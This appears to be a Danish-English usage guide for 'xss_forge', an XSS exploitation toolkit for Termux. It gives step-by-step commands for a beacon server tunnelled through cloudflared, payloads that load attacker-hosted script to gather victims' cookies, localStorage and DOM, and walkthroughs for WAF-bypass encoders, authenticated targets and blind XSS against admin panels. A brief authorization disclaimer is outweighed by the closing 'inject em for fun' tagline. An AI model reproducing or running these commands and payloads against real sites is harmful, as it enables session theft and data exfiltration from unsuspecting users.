# kArrmasXSSstrick ⚠️
xss vulnerability exploits 
miniature framework, detect, with one, crawler  exploits  xss    js


BENCH NOTES — what v2 adds, how to run on Termux, failure table                                                 
TERMUX SETUP (do this first)
  pkg update && pkg upgrade -y
  pkg install python curl jq cloudflared -y
  termux-setup-storage
  pip install --upgrade pip     # optional, we use stdlib only
  mkdir -p ~/xss && cd ~/xss
  # drop xss_forge.py and xss_forge_exploit.py into this dir

WHAT'S NEW IN v2

PAYLOADS — was ~50, now 200+
  html_text         19   script/img/svg/details/video/iframe/marquee/body/
                        input/select/textarea/keygen/isindex/button/math/mtext
  attr_dq           7    breaks quote, injects, restores
  attr_sq           4
  attr_unquoted     3
  js_dq             4    break string, import, fetch-eval
  js_sq             3
  js_template       3    ${...} interpolation escapes
  js_bare           3    direct statement context
  in_tag            4    add attribute without breaking tag
  url_href          5    javascript:, data: URIs
  css               4    @import via background, </style> break
  svg               4    animate, set, script href
  json              3    </script> break, unicode escape
  angular           4    {{constructor.constructor(...)()}}
  vue               2
  react_dangerously 1
  mxss              4    DOMPurify / sanitizer bypasses
  dom_clobber       3    name/id collision for script src
  blind             6    stored-XSS forms for admin panels
  polyglot          3    fire in multiple contexts

ENCODERS — was 12, now 21
  url, url2, url3, html_dec, html_hex, html_named,
  js_hex, js_uni, js_oct, js_ls, b64, b64url, case, backtick,
  angle_hex, angle_dec, split, css, utf16be,
  chain_hj (html→url), chain_uj (url2→js_uni)

NEW TOOLING

  domscan command
    python3 xss_forge.py domscan --file page.html
    Scans returned HTML for innerHTML/eval/document.write/etc.

  waf command
    python3 xss_forge.py waf --url https://target.tld/
    Detects Cloudflare, Akamai, Sucuri, Imperva, F5, AWS, ModSec,
    Barracuda, Wallarm — prints JSON.

  Multi-channel loader
    Every beacon now tries 5 channels in order: img, sendBeacon, fetch,
    form POST, top.location. If any one fires, you have the hit.

  Live tail
    http://<cb>/tail     auto-refreshing hits view
    http://<cb>/hits.json export
    http://<cb>/hits.log raw JSONL

EXPLOIT ENGINE — new flags

  --param NAME        single param (was --param, same)
  --all-params        also test q/s/search/id/page/name/msg/text/url/redirect
                      /next/return/view/mode/file/path/query/data/json/callback
  --headers           test User-Agent / Referer / X-Forwarded-For / X-Real-IP
                      / X-Originating-IP / X-Remote-IP / X-Client-IP / Forwarded / Origin
  --form              parse <form> blocks and test every <input name=...>
  --threads N         worker count (default 1 — raise carefully, some targets
                      rate-limit or WAF-hit at concurrency >4)
  --rate N            requests per second (default 5 — Termux on mobile is
                      slower; 3-10 is the sane range)
  --timeout N         seconds to wait for beacon (default 6)
  --cookies FILE      Netscape cookie file (auth, CSRF tokens, session)
  --encode NAME       force a specific encoder from forge.ENCODERS
  --one               stop after first reflected sink
  --verbose           show non-reflected probes

RUN THE FULL PLATFORM ON TERMUX — the actual commands

  Terminal 1 — beacon server:
    cd ~/xss
    python3 xss_forge.py serve --bind 0.0.0.0:8000

  Terminal 2 — https tunnel (needed for https targets):
    cloudflared tunnel --url http://localhost:8000
    # copy the https://xxxxx.trycloudflare.com URL

  Terminal 3 — fire:
    python3 xss_forge_exploit.py \
      --url "https://target.tld/search?q=x" \
      --all-params --headers --form \
      --cb https://xxxxx.trycloudflare.com \
      --threads 3 --rate 5 --timeout 8 \
      --verbose

  Watch hits:
    curl -s http://localhost:8000/hits.log | jq -c .
    # or open http://localhost:8000/ on the phone browser

FAILURE TABLE

  Probe says                     Cause                          Fix
  ────────────────────────────   ────────────────────────────   ──────────────────────────
  no_reflection on every param   sink not in query/body         try --headers
  reflected but no beacon        CSP blocks script-src          try svg/css/img payload
                                                                ctx or check headers
  reflected only in response     filter strips < >              try encoders --encode html_hex
  beacon fires but hits.log      hits.log in different dir      cd to ~/xss first
  empty                        (server started elsewhere)
  target https, cb http          mixed content                  use cloudflared tunnel URL
  403/406/429 responses          WAF or rate limit              drop --rate, add --cookies,
                                                                switch to blind payloads
  WAF detected in baseline       WAF fingerprint matched        try encoders, switch payloads
                                                                to mxss/polyglot set, slow down
  --form misses fields           inputs are loaded by JS        view-source, run --all-params
                                                                against the AJAX endpoint
  auth required                  no cookies sent                --cookies ~/netscape.txt
                                                                (export from browser:
                                                                EditThisCookie or F12→Application)

WHAT'S STILL NOT IN (deliberate)

  - No headless browser. Termux can't run Chrome sanely; DOM-XSS sinks
    that only fire client-side require an actual browser. domscan only
    finds the pattern — you still have to trigger it manually.
  - No deobfuscation of minified JS. If the sink is inside a minified
    bundle, view-source won't help; use f12 → Sources on a desktop.
  - No WebSocket fuzzing. Separate tool.
  - No SSTI / prototype pollution engines. Different class of bug.
  - No blind-XSS management UI for stored payloads on multiple endpoints.
    The blind context payloads are there; wiring a tracking-per-endpoint
    UI is a v3 job.

OPERATIONAL RULES (unchanged, worth repeating)

  - Authorization is on you. The tool fires; you own the paperwork.
  - Rotate cb subdomain per engagement so hits.log doesn't mix.
  - Don't bind /hits publicly when the operation is sensitive — bind
    the server to 127.0.0.1 and tunnel only /x.js and /p through a
    filtered proxy.
  - Termux is easy to fingerprint (UA). If the target has anti-bot
    logic, override --headers User-Agent from a real device UA string.


HVAD ER --cb

  --cb = "callback" (callback base URL).
  Det er den URL som payloadet ringer hjem til, når det fyrer i
  offerets browser. Uden --cb er payloadet blindt — det eksekverer,
  men du får intet at se.

  Konkret i xss_forge:

    payload = '<script src="{CB}/x.js"></script>'
    --cb https://abc.trycloudflare.com
    → <script src="https://abc.trycloudflare.com/x.js"></script>

  /x.js er den loader som xss_forge.py server selv udstiller. Når
  offerets browser henter den, kører loaderen i offerets origin, samler
  cookies/localStorage/DOM/fingerprint og POSTer dem til {CB}/p. Det
  POST lander i hits.log på din beacon-server.

  Derfor er --cb ALTID:
    - den offentligt tilgængelige URL til DIN beacon-server
    - IKKE offerets URL
    - IKKE localhost (offerets browser kan ikke nå din localhost)
    - https:// hvis offeret er https:// (ellers mixed content-blok)

  Reglen er enkel: den URL du kan åbne i din egen telefon-browser
  og se "xss_forge — 0 hits" på, er den URL der skal stå i --cb.

PROFESSIONEL SETUP — 3 TERMINALER, REN KOMMANDO

  Forudsætninger (engang):
    pkg update && pkg install python cloudflared jq -y
    mkdir -p ~/xss && cd ~/xss
    # læg xss_forge.py og xss_forge_exploit.py her

  ────────────────────────────────────────────────────────────────
  TERMINAL 1 — BEACON-SERVEREN (kører hele tiden)

    cd ~/xss
    python3 xss_forge.py serve --bind 0.0.0.0:8000

    Output du skal se:
      [xss_forge] serving on http://0.0.0.0:8000
      [xss_forge] loader:   http://0.0.0.0:8000/x.js
      [xss_forge] beacon:   http://0.0.0.0:8000/p
      [xss_forge] UI:       http://0.0.0.0:8000/

    Lad den køre. Ctrl+C stopper den.

  ────────────────────────────────────────────────────────────────
  TERMINAL 2 — HTTPS-TUNNEL

    cloudflared tunnel --url http://localhost:8000

    Output du skal se (efter ~5s):
      |  https://random-words-1234.trycloudflare.com   |
      |                                                |
      |  https://abc-def-ghi-9876.trycloudflare.com    |

    KOPIÉR den https-URL. Det er din --cb. Den lever kun mens
    cloudflared kører — lukker du terminalen, dør URL'en.

    Test at den virker (fra telefon-browser, ikke terminal):
      åbn https://abc-def-ghi-9876.trycloudflare.com
      → du skal se "xss_forge — 0 hits"
    Hvis du ser det, er kæden intakt.

  ────────────────────────────────────────────────────────────────
  TERMINAL 3 — EXPLOIT

  Scenario A — du kender param (mest professionelt, hurtigst):

    python3 xss_forge_exploit.py \
      --url "https://target.tld/search?q=hello&page=1" \
      --param q \
      --cb https://abc-def-ghi-9876.trycloudflare.com \
      --rate 3 \
      --timeout 8 \
      --verbose

  Scenario B — discovery (ved ikke hvilke params der er sårbare):

    python3 xss_forge_exploit.py \
      --url "https://target.tld/page?a=1&b=2&c=3" \
      --all-params \
      --headers \
      --form \
      --cb https://abc-def-ghi-9876.trycloudflare.com \
      --threads 3 \
      --rate 5 \
      --timeout 8 \
      --verbose

  Scenario C — autentificeret (kræver session):

    # eksportér cookies fra browseren først (F12 → Application → Cookies,
    # eller EditThisCookie til Netscape-format ~/cookies.txt)
    python3 xss_forge_exploit.py \
      --url "https://target.tld/dashboard?tab=profile" \
      --param tab \
      --cookies ~/cookies.txt \
      --cb https://abc-def-ghi-9876.trycloudflare.com \
      --rate 2 \
      --timeout 10 \
      --verbose

  Scenario D — WAF på, første payload blokeret:

    # brug encoder direkte i exploit-løkken
    python3 xss_forge_exploit.py \
      --url "https://target.tld/search?q=x" \
      --param q \
      --cb https://abc-def-ghi-9876.trycloudflare.com \
      --encode html_hex \
      --rate 2 \
      --timeout 10

  Scenario E — blind XSS (du kan ikke se reflection):

    # blind-context er for stored/admin-panels. Fyr payload, vent.
    # --one for at stoppe efter første hit
    python3 xss_forge_exploit.py \
      --url "https://target.tld/feedback" \
      --param message \
      --cb https://abc-def-ghi-9876.trycloudflare.com \
      --rate 1 \
      --timeout 30 \
      --one

HVAD DU SER NÅR DET VIRKER

  Terminal 3:
    [+] target: https://target.tld/search?q=hello&page=1
    [+] baseline: 200  12456B
    [+] 1 candidates to probe
    [+] query:q  reflected  ctx=html_text
    [*] firing context html_text at query:q
    [✓] HIT html_text[0] on query:q

  Terminal 1 (beacon):
    [hit] 203.0.113.45 https://target.tld/search?q=hello

  Terminal 3 eller ny terminal:
    tail -f ~/xss/hits.log | jq .
    # eller åbn https://abc-def-ghi-9876.trycloudflare.com/tail

  Du har nu i hits.log: cookies, localStorage, sessionStorage, URL,
  referer, UA, timezone, viewport, DOM-slice, canvas-fingerprint.
  Det er dit bevis på at XSS'en fyrede i en rigtig browser, på det
  rigtige domæne, med den rigtige cookie — det er hvad "exploit virker"
  betyder. Alt andet er gætværk.

HVAD DU GØR FORKERT 90% AF GANGENE

  1. Glemmer citationstegn om --url med & i
     → bash splitter, URL trunkeres ved &, probe rammer forkert side.
     FIX: --url "https://target.tld/?a=1&b=2"

  2. Bruger http://... som --cb mod et https://-target
     → Chrome blokerer mixed content, loaderen hentes aldrig.
     FIX: cloudflared giver dig https, brug den.

  3. Glemmer at beacon-serveren kører
     → loaderen får 404/connection refused, intet hit.
     FIX: test https://<cb>/ i browseren FØR du fyrer exploit.

  4. Har --cb pegende på localhost
     → offerets browser kan ikke se din localhost.
     FIX: --cb skal være den offentlige tunnel-URL, ikke localhost.

  5. Kører exploit FØR tunnel er oppe
     → --cb er en URL der ikke svarer endnu, loaderen får timeout.
     FIX: åbn tunnel-URL i browser og bekræft "0 hits" først.

  6. Har hits.log i en anden mappe end den du tjekker
     → du fyrer, der er hit, men tail -f ~/xss/hits.log ser intet
       fordi beacon-serveren blev startet fra en anden cwd.
     FIX: start beacon-serveren FRA ~/xss. Altid.

  7. Bruger --all-params mod en WAF uden rate-limit
     → 429 / IP-ban / WAF-fingerprint.
     FIX: --rate 2, tilføj --cookies, prøv ét param ad gangen først.

PROFESSIONEL ARBEJDSFLOW (rækkefølgen der virker)

  1. Rekognoscering — hvad er sinken?
       - Åbn target i browser, find input-felt, submit, se reflection i view-source
       - Ved du ikke, hvilken param der reflekteres: --all-params --verbose
       - Er det header-only: --headers
       - Er det en form: --form

  2. Beacon oppe
       - Terminal 1: serve
       - Terminal 2: cloudflared tunnel
       - Åbn tunnel-URL i browser → ser du "0 hits", er du klar

  3. Probe (dry)
       - Kør exploit MED --url quoted, UDEN at fyre endnu
       - Se "reflected ctx=..." på konsol
       - Forkert context = forkert payload = intet hit

  4. Fire
       - Exploit fyrer nu mod valgt param med valgt context
       - Hvis intet hit: skift encoder (--encode html_hex), prøv anden param

  5. Bevis
       - hits.log har din cookie, din URL, din DOM
       - Screenshot eller jq-udtræk er din PoC i rapporten

  6. Ryd op
       - Luk cloudflared (URL dør), stop beacon-serveren
       - Roter cb-subdomæne næste gang

FILL
  Igen: --cb er den offentlige https-URL til DIN beacon-server.
  Uden den er payloadet blindt. Med den er det en exploit.


FILL
  Both files must sit in the same directory, or pass --payloads-file
  with the full path to xss_forge.py.


KORT SVAR
  --param er NAVNET på det ene input-felt i URL'en du vil teste.
  Efter --param skriver du navnet — kun navnet, ikke værdien,
  ikke =, ikke citationstegn (medmindre navnet har mellemrum, hvilket
  det næsten aldrig har).

  --param q          ← "q" er navnet
  --param id         ← "id" er navnet
  --param search     ← "search" er navnet
  --param redirect   ← "redirect" er navnet

HVAD ET PARAMETER ER — 30 SEKUNDER

  En URL kan se sådan ud:

    https://shop.example.com/search?q=hello&category=books&page=2
                                     ↑       ↑            ↑
                                     q       category     page
                                     └───────┬────────────┘
                                        tre parametre

  Hver parameter har:
    - et NAVN   (q, category, page)
    - en VÆRDI  (hello, books, 2)
    - et = imellem
    - et & imellem hver parameter

  --param tager NAVNET. Ikke værdien.

  I eksemplet ovenfor er de tre gyldige --param-værdier:
    --param q
    --param category
    --param page

HVORDAN DU FINDER PARAM-NAVNET

  Metode 1 — se på URL'en i browseren
    Du åbner target, søger efter "test", URL'en bliver:
      https://shop.example.com/search?q=test
    → param er "q"

    Du klikker på kategori "books", URL bliver:
      https://shop.example.com/search?q=test&category=books
    → to params: "q" og "category"

  Metode 2 — se på formularen
    Højreklik på søgefeltet → Inspect → se <input name="...">
      <input type="text" name="q" ...>
    → param er "q"

    <select name="sort">
    → param er "sort"

  Metode 3 — kig på request i DevTools
    F12 → Network → klik på den request der loader siden →
    Headers → Query String Parameters → se listen.
    Hvert navn i listen er en gyldig --param-værdi.

  Metode 4 — brug --all-params i stedet
    Hvis du ikke vil finde navnet manuelt, giver --all-params
    motoren en liste at prøve. Men det er bredt — metode 1-3 er
    præcist.

KONKRETE EKSEMPLER — KOMMANDOEN FÆRDIG

  ─────────────────────────────────────────────
  EKSEMPEL 1 — søgefunktion
  ─────────────────────────────────────────────
  URL i browser:
    https://shop.example.com/search?q=hello&page=1

  Du vil teste "q". Kommando:

    python3 xss_forge_exploit.py \
      --url     "https://shop.example.com/search?q=hello&page=1" \
      --param   q \
      --cb      https://din.trycloudflare.com \
      --rate    3

  Efter --param står der: q
  Ikke "=hello", ikke "hello", ikke "\"q\"". Bare: q

  ─────────────────────────────────────────────
  EKSEMPEL 2 — profilvisning med id
  ─────────────────────────────────────────────
  URL:
    https://app.example.com/profile?id=42&tab=about

  Du vil teste "id". Kommando:

    python3 xss_forge_exploit.py \
      --url     "https://app.example.com/profile?id=42&tab=about" \
      --param   id \
      --cb      https://din.trycloudflare.com

  Efter --param står der: id

  Vil du teste "tab" i stedet:
    --param   tab

  ─────────────────────────────────────────────
  EKSEMPEL 3 — redirect-parameter
  ─────────────────────────────────────────────
  URL:
    https://site.example.com/login?next=/dashboard&lang=en

  Du vil teste "next". Kommando:

    python3 xss_forge_exploit.py \
      --url     "https://site.example.com/login?next=/dashboard&lang=en" \
      --param   next \
      --cb      https://din.trycloudflare.com

  Efter --param står der: next

  ─────────────────────────────────────────────
  EKSEMPEL 4 — POST-formular
  ─────────────────────────────────────────────
  Du har en formular der sender POST til /feedback med feltet
  <textarea name="message">. URL er:
    https://site.example.com/feedback

  Ingen params i URL'en, men formen har et. Brug --form:

    python3 xss_forge_exploit.py \
      --url     "https://site.example.com/feedback" \
      --form \
      --cb      https://din.trycloudflare.com

  --form scanner formen og finder "message" selv.
  Vil du KUN teste "message":
    --param   message
    (virker også for POST, motoren finder form-action selv)

  ─────────────────────────────────────────────
  EKSEMPEL 5 — header-reflection
  ─────────────────────────────────────────────
  Target reflekterer User-Agent i en fejlside. Ingen URL-param.
  Brug --headers:

    python3 xss_forge_exploit.py \
      --url     "https://site.example.com/" \
      --headers \
      --cb      https://din.trycloudflare.com

  Vil du kun teste User-Agent:
    --param   User-Agent

HVAD DER IKKE SKAL STÅ EFTER --param

  ─────────────────────────────────────────────
  FORKERT                      HVORFOR
  ─────────────────────────────────────────────
  --param q=hello              Det er navn+værdi, ikke navn
  --param "q"                  Citationstegn er unødvendige (men
                               skader ikke — bash stripper dem)
  --param https://...          Det er ikke et param, det er en URL
  --param ?q                   ? hører til URL'en, ikke navnet
  --param &q                   & hører til URL'en, ikke navnet
  --param hello                Du gav værdien, ikke navnet

  ─────────────────────────────────────────────
  RIGTIGT                       HVORFOR
  ─────────────────────────────────────────────
  --param q                    Navnet, præcis som i URL'en
  --param id                   Navnet, præcis som i URL'en
  --param search               Navnet, præcis som i URL'en
  --param redirect             Navnet, præcis som i URL'en
  --param message              Navnet på et form-felt

CASE-SENSITIVT — STORT VIGTIGT

  --param Q       ← matcher IKKE q
  --param q       ← matcher q

  Parameternavne er case-sensitive. Hvis URL'en har ?Q=, skal du
  skrive --param Q. Hvis ?q=, så --param q.

  Samme for: Name vs name vs NAME. Tjek URL'en byte for byte.

HVAD MOTOREN GØR MED --param

  Antag:
    --url "https://site.example.com/search?q=hello&page=2"
    --param q

  Motoren:

  1) Laver en probe:
       https://site.example.com/search?q=cHq7abcdefzq7&page=2
       (q's værdi erstattet med en unik canary, page urørt)

  2) Ser om canary er i svaret:
       - Ja  → q er en sink, fortsæt
       - Nej → q reflekteres ikke, prøv anden param eller stop

  3) Hvis ja: finder context (html_text, attr_dq, js_sq, ...)

  4) Fyrer payloads fra den context mod q:
       https://site.example.com/search?q=<script src="https://din/x.js"></script>&page=2

  5) Venter på beacon på din --cb

  Motoren rører ALDRIG page, category, sort eller andre params.
  Kun q's værdi udskiftes.

HVIS DU HAR FLERE PARAMS DU VIL TESTE

  Metode A — én ad gangen:
    Kør kommandoen med --param q
    Kør kommandoen med --param page
    Kør kommandoen med --param category

  Metode B — automatisk:
    Skift --param q til --all-params:
      --all-params
    Motoren tester q, page, category PLUS en liste med almindelige
    navne. Hurtigere men mere støjende.

  Metode C — kun de params der er i URL'en:
    Hvis URL er ?q=test&page=2&cat=x, tester --all-params ALLE
    tre plus en håndfuld ekstra. Hvis du kun vil de tre:
    --param q    (kør)
    --param page (kør)
    --param cat  (kør)

DEN HURTIGE TJEKLISTE

  Før du skriver --param:

  [ ] Du har åbnet target i browser
  [ ] URL'en har ? eller & med navn= i sig
  [ ] Du har læst navnene: q, id, page, ...
  [ ] Du har valgt ét navn
  [ ] Du skriver navnet præcis (case-sensitive)
  [ ] Ingen = og ingen værdi bagefter
  [ ] (Valgfrit) citationstegn omkring navnet hvis det har mellemrum

FILL
  Hvis URL'en ikke har nogen ?-params, er --param forkert værktøj.
  Så skal du bruge --headers (header-reflection), --form (formular)
  eller en POST-endpoint.

DEN GENERISKE FORM

  python3 xss_forge_exploit.py \
    --url        "https://TARGET/sti?eksisterende=1&query=2"   \
    --param      DIT_PARAM                                       \
    --cb         https://DIN-TUNNEL.trycloudflare.com            \
    --rate       N                                               \
    --timeout    N                                               \
    --verbose

  Hvert flag får ÉN værdi. Backslash \ i slutningen af linjen betyder
  "kommandoen fortsætter på næste linje". Det er kun for læsbarhed —
  du kan også skrive det hele på én linje.

  RÆKKEFØLGEN af flag er ligegyldig. Bash sender dem i den rækkefølge
  du skriver, men python-parseren finder dem uanset.

  CITATIONSTEGN omkring --url er OBLIGATORISK hvis URL'en har & i sig.
  Uden " " splitter bash ved &, og du får job-control-linjerne
  [3] Done state=cyber [4] Done response_type=code som du så.

────────────────────────────────────────────────────────────────────
SCENARIE 1 — DU KENDER PARAM OG ER SIKKER PÅ SINK'EN
────────────────────────────────────────────────────────────────────

  Eksempel-target:
    https://shop.example.com/search?q=hello&category=books

  Du har åbnet den i browseren, skrevet "hello", set reflection i
  view-source. Du VED q er sink'en. Du vil fyre ét payload, se ét hit.

  Kommando:

  python3 xss_forge_exploit.py \
    --url     "https://shop.example.com/search?q=hello&category=books" \
    --param   q \
    --cb      https://abc-def-1234.trycloudflare.com \
    --rate    3 \
    --timeout 8 \
    --verbose

  Linje for linje:

    --url     ─ target. Quoted. Behold ALLE eksisterende params —
                kategori, filter, whatever. Exploit-motoren bevarer
                dem og udskifter kun --param's værdi.
    --param   ─ det ene parameter der testes. Her: q.
                Motoren sætter q=<canary> i stedet for "hello",
                fyrer, ser om canary reflekteres, finder context.
    --cb      ─ din offentlige tunnel-URL. IKKE localhost.
                Det er den URL offerets browser henter /x.js fra.
    --rate    ─ max requests/sekund. 3 er sikkert. 5 er aggressivt.
                10 er en WAF-invite.
    --timeout ─ hvor mange sekunder motoren venter på beacon efter
                hvert payload. 8 er standard. 15 hvis target er langsomt.
    --verbose ─ print også non-reflected probes, så du ser hvad der
                fejlede og hvorfor.

────────────────────────────────────────────────────────────────────
SCENARIE 2 — DU VED IKKE HVILKEN PARAM DER ER SÅRBAR
────────────────────────────────────────────────────────────────────

  Eksempel-target:
    https://app.example.com/profile?id=42&tab=overview&lang=en

  Du ved ikke hvilken af id/tab/lang der er sink'en. Motoren skal selv
  finde den.

  Kommando:

  python3 xss_forge_exploit.py \
    --url        "https://app.example.com/profile?id=42&tab=overview&lang=en" \
    --all-params \
    --headers \
    --cb         https://abc-def-1234.trycloudflare.com \
    --threads    3 \
    --rate       5 \
    --timeout    8 \
    --verbose

  Hvad de ekstra flag gør:

    --all-params ─ test også id/tab/lang PLUS en liste af almindelige
                   params (q, s, search, name, msg, text, url, redirect,
                   next, return, view, mode, file, path, query, data,
                   json, callback). Altid værd at smide med.
    --headers    ─ test også User-Agent, Referer, X-Forwarded-For osv.
                   Nogle targets reflekterer disse i fejlsider eller
                   analytics.
    --threads 3  ─ tre parallelle probes. Gør discovery hurtigere.
                   Hold den lav ved WAF-mistanke.
    --rate 5     ─ fem requests/sekund samlet (ikke per thread).

────────────────────────────────────────────────────────────────────
SCENARIE 3 — AUTENTIFICERET TARGET (kræver session)
────────────────────────────────────────────────────────────────────

  Eksempel: du er logget ind på dashboard med en testkonto.
  Session-cookie skal sendes med på hver request.

  Trin 1 — eksportér cookies:
    F12 → Application → Cookies → target → kopiér
    eller brug en extension der gemmer Netscape-format til cookies.txt

    Netscape-format ser sådan ud (tab-separeret):
      .example.com      TRUE    /       FALSE   1799999999      session abc123

  Trin 2 — kør exploit med --cookies:

  python3 xss_forge_exploit.py \
    --url     "https://app.example.com/dashboard?tab=profile" \
    --param   tab \
    --cookies ~/cookies.txt \
    --cb      https://abc-def-1234.trycloudflare.com \
    --rate    2 \
    --timeout 10 \
    --verbose

  --cookies gør at motoren:
    - loader Netscape-filen
    - sender cookies på HVER request
    - bevarer redirect-kæder med cookies intakt

  Uden --cookies får du 302→login og "no_reflection" på alt.

────────────────────────────────────────────────────────────────────
SCENARIE 4 — WAF DETECTERET, STANDARD PAYLOAD BLOKERET
────────────────────────────────────────────────────────────────────

  Du kørte scenarie 1 og fik:

    [!] WAF detected: cloudflare
    [+] query:q  reflected  ctx=html_text
    [*] firing context html_text at query:q
    all 19 payloads fired, no beacon

  CSP eller WAF filtrerer script-tags. Prøv encoder:

  python3 xss_forge_exploit.py \
    --url     "https://shop.example.com/search?q=hello" \
    --param   q \
    --cb      https://abc-def-1234.trycloudflare.com \
    --encode  html_hex \
    --rate    2 \
    --timeout 10

  --encode NAME tager en encoder fra forge.ENCODERS:
    html_hex  → &lt; bliver &#x3c; — omgår naive < -filtre
    js_uni    → &lt; bliver \u003c — for JS-string kontekster
    b64       → base64 — til eval(atob(...)) payloads
    url2      → dobbelt-URL — omgår one-pass decodere

  Prøv stadig ét payload ad gangen. Ikke alle encoders passer til
  alle contexts.

────────────────────────────────────────────────────────────────────
SCENARIE 5 — BLIND XSS (admin-panel, ingen reflection at se)
────────────────────────────────────────────────────────────────────

  Target: https://feedback.example.com/submit
  Du skriver en besked, den gemmes, en admin ser den senere.
  Du kan IKKE se om det virker fra din egen browser.

  Kommando:

  python3 xss_forge_exploit.py \
    --url     "https://feedback.example.com/submit" \
    --param   message \
    --cb      https://abc-def-1234.trycloudflare.com \
    --rate    1 \
    --timeout 30 \
    --one

  Forskelle:
    --rate 1     ─ meget lav hastighed. Du fyrer mod et system der
                   ikke må rate-limite dig.
    --timeout 30 ─ lang ventetid. Admin åbner måske først siden om
                   20 sekunder. Motoren venter.
    --one        ─ stop efter første hit. Blind XSS er engangs —
                   ét hit beviser alt.

  I praksis: beacon-serveren skal køre i timer, ikke minutter.
  Admin åbner måske i morgen. Lad cloudflared køre, tjek hits.log
  næste dag.

────────────────────────────────────────────────────────────────────
FULDT EKSEMPEL — KLAR TIL COPY/PASTE
────────────────────────────────────────────────────────────────────

  Antag:
    - target er https://vuln.example.com/search?q=test&page=2
    - du vil discovery (params + headers + form)
    - cloudflared gav dig: https://beacon-xyz.trycloudflare.com

  Terminal 1:
    cd ~/xss
    python3 xss_forge.py serve --bind 0.0.0.0:8000

  Terminal 2:
    cloudflared tunnel --url http://localhost:8000
    # kopier https://beacon-xyz.trycloudflare.com

  Terminal 3 — HELE kommandoen:

  python3 xss_forge_exploit.py \
    --url        "https://vuln.example.com/search?q=test&page=2" \
    --all-params \
    --headers \
    --form \
    --cb         https://beacon-xyz.trycloudflare.com \
    --threads    3 \
    --rate       4 \
    --timeout    8 \
    --verbose

  Du ser:
    [+] target: https://vuln.example.com/search?q=test&page=2
    [+] baseline: 200  15678B
    [+] 8 candidates to probe
    [+] query:q  reflected  ctx=html_text
    [+] query:page  reflected  ctx=attr_dq
    [+] form:search_input  reflected  ctx=attr_sq
    [*] firing context html_text at query:q
    [✓] HIT html_text[0] on query:q

  Og i Terminal 1:
    [hit] 203.0.113.45 https://vuln.example.com/search?q=...
    [hit] 203.0.113.45 https://vuln.example.com/search?q=...

────────────────────────────────────────────────────────────────────
HVORDAN DU LINER OP — TJEKLISTE
────────────────────────────────────────────────────────────────────

  Før du trykker Enter, verificér:

  [ ] --url er i " " (citationstegn)
  [ ] --url har ALLE target's eksisterende params med
  [ ] --param er den ene du vil teste (eller --all-params)
  [ ] --cb er https:// (ikke http://) hvis target er https://
  [ ] --cb er tunnel-URL, IKKE localhost
  [ ] Beacon-serveren kører (Terminal 1 viser "serving on...")
  [ ] Tunnelen er oppe (Terminal 2 viser https://...trycloudflare.com)
  [ ] Du har åbnet tunnel-URL i browser → "xss_forge — 0 hits"
  [ ] --rate er 1-5 (ikke 50)
  [ ] --timeout er 6-15 for normal, 30+ for blind
  [ ] Du arbejder FRA ~/xss (så hits.log er i samme mappe)

  Hvis alle er [x], tryk Enter.

────────────────────────────────────────────────────────────────────
PARAMETER-REFERENCE (alle flag, ét sted)
────────────────────────────────────────────────────────────────────

  PÅKRÆVET:
    --url URL       Target. Quoted. Behold eksisterende params.
    --cb URL        Din tunnel. https:// hvis target https://.

  MÅLRETNING:
    --param NAME    Ét specifikt parameter at teste.
    --all-params    Test også q/s/search/id/page/name/msg/text/
                    url/redirect/next/return/view/mode/file/path/
                    query/data/json/callback.
    --headers       Test User-Agent, Referer, X-Forwarded-For,
                    X-Real-IP, X-Originating-IP, X-Remote-IP,
                    X-Client-IP, Forwarded, Origin.
    --form          Parse <form> og test hvert <input name=...>.
    --cookies FILE  Netscape cookie file (session/auth).

  HASTIGHED:
    --threads N     Parallelle workers (default 1).
    --rate N        Requests/sekund (default 5).
    --timeout N     Sekunder at vente på beacon (default 6).

  FINJUSTERING:
    --encode NAME   Tving encoder: url/url2/url3/html_dec/html_hex/
                    html_named/js_hex/js_uni/js_oct/js_ls/b64/b64url/
                    case/backtick/angle_hex/angle_dec/split/css/
                    utf16be/chain_hj/chain_uj
    --one           Stop efter første reflected sink.
    --verbose       Vis også non-reflected probes.
    --payloads-file Path til xss_forge.py (default: ./xss_forge.py).

  IKKE FLAGS MEN VIGTIGT:
    - cd ~/xss FØR du starter nogen af terminalerne. hits.log
      havner i cwd.
    - start beacon-serveren FØR exploit.
    - start tunnel FØR exploit.
    - test tunnel-URL i browser FØR exploit.

FILL
  Ingen FILL — kommandoen er komplet. Hvis du vil have en
  --dry-run der viser hvad der VILLE blive fyre uden at fyre, sig
  til; det er en 10-linjers patch.

Creater - kArmasec ☠ SYSTEM BREACHED ☠ — inject em for fun
